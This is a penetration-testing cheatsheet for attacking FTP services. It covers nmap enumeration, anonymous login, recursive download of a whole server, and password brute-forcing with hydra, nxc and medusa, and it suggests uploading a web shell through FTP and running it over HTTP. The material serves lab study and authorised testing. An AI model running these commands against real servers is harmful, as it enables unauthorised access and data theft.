# FTP (21)

[[09 - Service Cheatsheets/00 - README|Folder index]]

## Attacker Mindset

File transfer in cleartext. Often misconfigured. Anonymous access is common on older systems, IoT devices, and forgotten staging boxes. If you see this, think: credentials in transit, file exfil staging, or misconfigured permissions. Pair it with a web server on the same host and a writable directory = upload a web shell to FTP, execute via HTTP. **Common attack vectors:** anonymous login, brute force, cleartext credential sniff, FTP bounce attacks, malicious file upload.

## Enumerate

```bash
nmap -sV -sC -p 21 $IP
nmap --script ftp-* -p 21 $IP
```

## Anonymous login

```bash
ftp $IP
# Username: anonymous
# Password: (blank or any email)

# Or with lftp
lftp $IP -u anonymous,
```

## Download everything

```bash
wget -r ftp://anonymous:@$IP/
# Or inside ftp client:
binary
prompt OFF
mget *
```

## Brute-force

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://$IP -t 16
nxc ftp $IP -u users.txt -p passwords.txt

With Medusa, we can use the option -u to specify a single user to target, or you can use the option -U to provide a file with a list of usernames. The option -P is for a file containing a list of passwords. We can use the option -M and the protocol we are targeting (FTP) and the option -h for the target hostname or IP address.

Note: Although we may find services vulnerable to brute force, most applications today prevent these types of attacks. A more effective method is Password Spraying.

Brute Forcing with Medusa

AlexAviles@htb[/htb]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
```
